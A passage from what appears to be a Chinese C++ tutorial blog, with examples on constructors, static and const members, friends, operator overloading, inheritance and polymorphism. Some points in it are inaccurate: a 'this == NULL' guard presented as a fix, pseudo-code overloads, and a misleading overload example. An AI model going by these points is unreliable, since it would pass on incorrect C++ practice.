    std::cout &lt;&lt; <span class="string">&quot;Constructor called&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">MyClass</span>(<span class="type">const</span> MyClass&amp; other) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Copy constructor called&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">MyClass <span class="title">createObject</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    MyClass obj;</span><br><span class="line">    <span class="keyword">return</span> obj;  <span class="comment">// 在函数返回之前，会调用拷贝构造函数来创建 obj 的副本</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    MyClass newObj = <span class="built_in">createObject</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.主动拷贝</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> m_value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">MyClass</span>(<span class="type">int</span> value) : <span class="built_in">m_value</span>(value) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Constructor called&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">MyClass</span>(<span class="type">const</span> MyClass&amp; other) : <span class="built_in">m_value</span>(other.m_value) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Copy constructor called&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">MyClass <span class="title">obj1</span><span class="params">(<span class="number">42</span>)</span></span>;</span><br><span class="line">    MyClass obj2 = obj1;  <span class="comment">// 使用拷贝构造函数进行主动拷贝</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-3-静态类"><a href="#2-3-静态类" class="headerlink" title="2.3 静态类"></a>2.3 静态类</h4><blockquote><p>静态成员变量：在类内定义（不可初始化），在类外全局处（不可以在函数中）初始化（不赋值默认0），初始化案例： <code>int test::c ;</code></p><p>静态成员函数：只可以访问静态变量。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> count; <span class="comment">// 静态成员变量</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">incrementCount</span><span class="params">()</span> </span>&#123; <span class="comment">// 静态成员函数</span></span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> Test::count = <span class="number">0</span>; <span class="comment">// 静态成员变量初始化</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Count: &quot;</span> &lt;&lt; Test::count &lt;&lt; endl; <span class="comment">// 输出</span></span><br><span class="line">    Test::<span class="built_in">incrementCount</span>(); <span class="comment">// 调用静态成员函数</span></span><br><span class="line">    Test::<span class="built_in">incrementCount</span>();</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Count: &quot;</span> &lt;&lt; Test::count &lt;&lt; endl; <span class="comment">// 输出</span></span><br><span class="line">    Test::<span class="built_in">incrementCount</span>();</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Count: &quot;</span> &lt;&lt; Test::count &lt;&lt; endl; <span class="comment">// 输出</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-4-类内存"><a href="#2-4-类内存" class="headerlink" title="2.4 类内存"></a>2.4 类内存</h4><blockquote><p>内存：空对象为1B，非空对象成员变量和是多少内存就是多少。</p><ul><li>空对象实例化为1B，空对象指针实例化为4B</li><li>有虚函数的类对象中都有一个虚函数表指针 __vptr，大小为4B(32位机器) / 8B(64位机器)</li><li>成员函数和静态成员不包含在其中（分开存储）。</li></ul><p>this指针指向被调用的成员函数所属的对象。<code>return *this;</code> 可以返回自身（函数返回值是 <code>class_name&amp;</code> ）。</p><p>空指针可以访问成员函数，但是下列情况会异常：</p><ul><li>遇到 this会异常（因为指针为0） （可以添加代码来避免：if( this == NULL) { return ; }）。</li><li>遇到虚函数会直接异常（因为找不到虚函数表）</li></ul></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">string name = <span class="string">&quot;123&quot;</span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printMessage</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// if (this == NULL)&#123;return;&#125; // 加此代码可以避免异常</span></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Hello, I am MyClass!&quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;name &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">printMessage2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Hello, I am MyClass!&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    MyClass* ptr = <span class="literal">nullptr</span>; <span class="comment">// 空指针</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用空指针调用成员函数</span></span><br><span class="line">    ptr-&gt;<span class="built_in">printMessage</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 调用虚函数直接异常</span></span><br><span class="line">    ptr-&gt;<span class="built_in">printMessage2</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-5-常值类"><a href="#2-5-常值类" class="headerlink" title="2.5 常值类"></a>2.5 常值类</h4><blockquote><p>常函数：<code>void add() const &#123;&#125;;</code>。不可以在函数内修改类的值（相当于：<code>const Class * const this</code>），不会调用其他非const的成员函数。但若加上 mutable 的属性则可以在常函数中修改值。</p><p>常对象：<code>const Class name;</code>。只可以调用常函数。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> value;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">setValue</span><span class="params">(<span class="type">int</span> newValue)</span> </span>&#123;</span><br><span class="line">        value = newValue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">printValue</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Value: &quot;</span> &lt;&lt; value &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">const</span> MyClass obj; <span class="comment">// 常对象</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// obj.setValue(10); // 错误，常对象不可调用非常函数</span></span><br><span class="line">    obj.<span class="built_in">printValue</span>(); <span class="comment">// 可以调用常函数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="2-6-友元"><a href="#2-6-友元" class="headerlink" title="2.6 友元"></a>2.6 友元</h4><blockquote><p>在类外访问类内的私有属性或方法。</p><ul><li>友好函数：在类中用 <code>friend type funtion();</code>声明类外的全局函数即可。</li><li>友好类：在类中用<code>friend class name;</code> 声明类外的其他类即可。</li><li>友好类函数：在类中用 <code>friend type class_name::function();</code> 声明类外的其他类中的函数即可。</li></ul></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> privateData;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">MyClass</span>(<span class="type">int</span> data) : <span class="built_in">privateData</span>(data) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 友好函数声明</span></span><br><span class="line">    <span class="function"><span class="keyword">friend</span> <span class="type">void</span> <span class="title">friendFunction</span><span class="params">(<span class="type">const</span> MyClass&amp; obj)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 友好类声明</span></span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> <span class="title class_">FriendClass</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 友好函数定义</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">friendFunction</span><span class="params">(<span class="type">const</span> MyClass&amp; obj)</span> </span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Friend function accessing private data: &quot;</span> &lt;&lt; obj.privateData &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 友好类定义</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FriendClass</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">accessPrivateData</span><span class="params">(<span class="type">const</span> MyClass&amp; obj)</span> </span>&#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Friend class accessing private data: &quot;</span> &lt;&lt; obj.privateData &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">MyClass <span class="title">obj</span><span class="params">(<span class="number">42</span>)</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 通过友好函数访问私有数据</span></span><br><span class="line">    <span class="built_in">friendFunction</span>(obj);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过友好类访问私有数据</span></span><br><span class="line">    FriendClass friendObj;</span><br><span class="line">    friendObj.<span class="built_in">accessPrivateData</span>(obj);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-运算符重载"><a href="#3-运算符重载" class="headerlink" title="3 运算符重载"></a>3 运算符重载</h3><blockquote><p>自定义的数据类型进行运算。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 操作符重载（分成员函数重载和全局函数重载，同理，但调用方式不同）。</span></span><br><span class="line">type <span class="keyword">operator</span>+() &#123;&#125;;</span><br><span class="line">type <span class="keyword">operator</span>-() &#123;&#125;;</span><br><span class="line">type <span class="keyword">operator</span>*() &#123;&#125;;</span><br><span class="line">type <span class="keyword">operator</span>/() &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 左移运算符（用在 cout 输出，只能全局定义，本质就是 cout &lt;&lt; p ）</span></span><br><span class="line">type <span class="keyword">operator</span>&lt;&lt;( ostream&amp; cout , <span class="keyword">class</span>&amp; p ) &#123; ... &#125;; </span><br><span class="line"><span class="comment">// 无限追加（此操作可以实现 cout &lt;&lt; p 后可以追加其他内容）</span></span><br><span class="line">ostream&amp; <span class="keyword">operator</span>&lt;&lt;( ostream&amp; cout , <span class="keyword">class</span>&amp; p )&#123; </span><br><span class="line">    <span class="keyword">return</span> cout; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 递增运算符（前置/后置）（通过在括号中加 int 区分前置和后置，递减同理）</span></span><br><span class="line"><span class="keyword">class</span>&amp; <span class="keyword">operator</span>++() &#123; </span><br><span class="line">    <span class="keyword">this</span>.num ++; </span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">operator</span>++( <span class="type">int</span> ) &#123; </span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">temp</span> = *<span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">this</span>.num++;</span><br><span class="line">    <span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 赋值运算符（用于深拷贝，之前类中数据存在应先释放再赋值）</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">operator</span>=( <span class="keyword">class</span>&amp; p ) &#123; </span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关系运算符</span></span><br><span class="line"><span class="type">bool</span> <span class="keyword">operator</span>==( <span class="keyword">class</span>&amp; p ) &#123; ... &#125;</span><br><span class="line"><span class="type">bool</span> <span class="keyword">operator</span>&gt;( <span class="keyword">class</span>&amp; p ) &#123; ... &#125;</span><br><span class="line"><span class="type">bool</span> <span class="keyword">operator</span>&lt;( <span class="keyword">class</span>&amp; p ) &#123; ... &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数调用运算符（仿函数）（类名当函数名用）</span></span><br><span class="line">type <span class="built_in">operator</span>( ... ) &#123; ... &#125; </span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">加法操作符重载案例</span></span><br><span class="line"><span class="comment">成员函数重载调用：double res = obj + 1.0;</span></span><br><span class="line"><span class="comment">全局函数重载调用：double res = 1.0 + 2.0;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">double</span> data;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">MyClass</span>(<span class="type">double</span> val) : <span class="built_in">data</span>(val) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 成员函数重载</span></span><br><span class="line"><span class="type">double</span> <span class="keyword">operator</span>+(<span class="type">double</span> operand) <span class="type">const</span> &#123;</span><br><span class="line"><span class="keyword">return</span> data + operand;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">getData</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局函数重载</span></span><br><span class="line"><span class="type">double</span> <span class="keyword">operator</span>+(MyClass operand1, MyClass operand2) &#123;</span><br><span class="line"><span class="keyword">return</span> operand1.<span class="built_in">getData</span>() + operand2.<span class="built_in">getData</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="function">MyClass <span class="title">obj</span><span class="params">(<span class="number">2.0</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 成员函数重载调用</span></span><br><span class="line"><span class="type">double</span> res1 = obj + <span class="number">1.0</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;Member function overload result: &quot;</span> &lt;&lt; res1 &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局函数重载调用</span></span><br><span class="line"><span class="type">double</span> res2 = <span class="number">1.0</span> + <span class="number">2.0</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;Global function overload result: &quot;</span> &lt;&lt; res2 &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 无限追加案例</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 前置和后置</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 仿函数</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="4-继承"><a href="#4-继承" class="headerlink" title="4 继承"></a>4 继承</h3><blockquote><p>继承方式：</p><ul><li><p>基础继承：<code>class child: public father [ ,public father ...]</code>（class 派生类 : 继承方式 基类）</p></li><li><p>公共继承：public（可以访问父类公共的东西，且权限不变）</p></li><li>保护继承：protected（可以访问父类公共和受保护的东西，且权限变为受保护）</li><li>私有继承：private（可以访问父类公共和受保护的东西，且权限变为私有）</li></ul><p>继承特性：</p><ul><li>父类中所有非静态成员属性都会被继承（包括私有属性）</li><li>构造和析构：先构造父类，再构造子类。而析构相反。</li><li><p>子类和父类中出现同名成员：</p><ul><li>访问子类：<code>&lt;obj&gt;.&lt;name&gt;</code></li><li>访问父类：<code>&lt;obj&gt;.&lt;class&gt;::&lt;name&gt;</code></li></ul></li><li><p>注：同名参数在子类重写后父类中依旧存在。（用 sizeof 可以发现内存大小不变，参数只是隐藏了而已。和python不同，父类中写的函数中含有 this 的话会指向父类的属性而非子类重写的属性）</p></li><li>注：子类出现了与父类同名的函数，则会隐藏掉所有父类的同名函数（包括重载）</li></ul><p>菱形继承问题定义：两个派生类继承了同一个基类，然后又有一个派生类继承了这两个派生类。</p><ol><li>使用属性时通过作用域区分。</li><li>利用虚继承，在两个派生类继承方式之前加上关键字 virtual（class student : virtual public people），（此时继承下来的东西为 { vbptr }（virtual base pointer：虚基类指针），直接指向第一份数据，在第三个派生生继承时就不会产生二义性）</li></ol></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 继承</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Father</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> publicData;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">publicFunction</span><span class="params">()</span> </span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Father&#x27;s public function&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line"><span class="type">int</span> protectedData;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">protectedFunction</span><span class="params">()</span> </span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Father&#x27;s protected function&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> privateData;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">privateFunction</span><span class="params">()</span> </span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Father&#x27;s private function&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 公共继承</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Child_Public</span> : <span class="keyword">public</span> Father &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">accessFatherData</span><span class="params">()</span> </span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Accessing father&#x27;s public data: &quot;</span> &lt;&lt; publicData &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 保护继承</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Child_Protected</span> : <span class="keyword">protected</span> Father &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">accessFatherData</span><span class="params">()</span> </span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Accessing father&#x27;s protected data: &quot;</span> &lt;&lt; protectedData &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 私有继承</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Child_Private</span> : <span class="keyword">private</span> Father &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">accessFatherData</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//cout &lt;&lt; &quot;Accessing father&#x27;s private data: &quot; &lt;&lt; privateData &lt;&lt; endl; // 错误：无法访问父类私有成员</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">Child_Public child1;</span><br><span class="line">child1.publicData = <span class="number">42</span>;</span><br><span class="line">child1.<span class="built_in">accessFatherData</span>();</span><br><span class="line">child1.<span class="built_in">publicFunction</span>();</span><br><span class="line"></span><br><span class="line">Child_Protected child2;</span><br><span class="line">child2.<span class="built_in">accessFatherData</span>(); <span class="comment">// 错误数据：无法从外部访问受保护的成员</span></span><br><span class="line"><span class="comment">//child2.publicFunction(); // 函数变成受保护权限，无法调用</span></span><br><span class="line"></span><br><span class="line">Child_Private child3;</span><br><span class="line">child3.<span class="built_in">accessFatherData</span>(); <span class="comment">// 错误：无法从外部访问私有成员</span></span><br><span class="line"><span class="comment">//child3.publicFunction(); // 函数变成受私有权限，无法调用</span></span><br><span class="line"></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;child publicData data:&quot;</span> &lt;&lt; child1.publicData &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;father publicData data:&quot;</span> &lt;&lt; child1.Father::publicData &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 菱形继承问题</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> data;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Base</span>(<span class="type">int</span> val) : <span class="built_in">data</span>(val) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Derived1</span> : <span class="keyword">virtual</span> <span class="keyword">public</span> Base &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Derived1</span>(<span class="type">int</span> val) : <span class="built_in">Base</span>(val) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Derived2</span> : <span class="keyword">virtual</span> <span class="keyword">public</span> Base &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Derived2</span>(<span class="type">int</span> val) : <span class="built_in">Base</span>(val) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Derived3</span> : <span class="keyword">public</span> Derived1, <span class="keyword">public</span> Derived2 &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Derived3</span>(<span class="type">int</span> val) : <span class="built_in">Base</span>(val), <span class="built_in">Derived1</span>(val), <span class="built_in">Derived2</span>(val) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="function">Derived3 <span class="title">obj</span><span class="params">(<span class="number">42</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过作用域区分属性</span></span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;Data from Derived1: &quot;</span> &lt;&lt; obj.Derived1::data &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;Data from Derived2: &quot;</span> &lt;&lt; obj.Derived2::data &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用虚继承解决菱形继承问题</span></span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;Data from Derived3: &quot;</span> &lt;&lt; obj.data &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-多态"><a href="#5-多态" class="headerlink" title="5 多态"></a>5 多态</h3><h4 id="5-1-分类"><a href="#5-1-分类" class="headerlink" title="5.1 分类"></a>5.1 分类</h4><blockquote><p>静态多态：函数重载，运算符重载，复用函数名。</p><p>动态多态：派生类，虚函数。</p><p>静态多态的函数地址早绑定：编译阶段确定函数地址。</p><p>动态多态的函数地址晚绑定：运行阶段确定函数地址。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 案例：cat:animal,speak(animal an)。传入cat 到 speak 中，输出的结果是 animal 的，因为是地址早绑定，编译阶段就确定了函数地址。（与 JAVA 和 C# 不同）</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">speak</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Animal speaks&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span> : <span class="keyword">public</span> Animal &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">speak</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Cat speaks&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">speak</span><span class="params">(Animal* animal)</span> </span>&#123;</span><br><span class="line">    animal-&gt;<span class="built_in">speak</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Cat cat;</span><br><span class="line">    <span class="built_in">speak</span>(&amp;cat); <span class="comment">// 输出结果为 &quot;Animal speaks&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 解决方案：父类函数前加上 virtual 变成虚函数，使其变成动态函数，运行时才会确定地址，这样 speak 函数在调用时会先找子类。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span 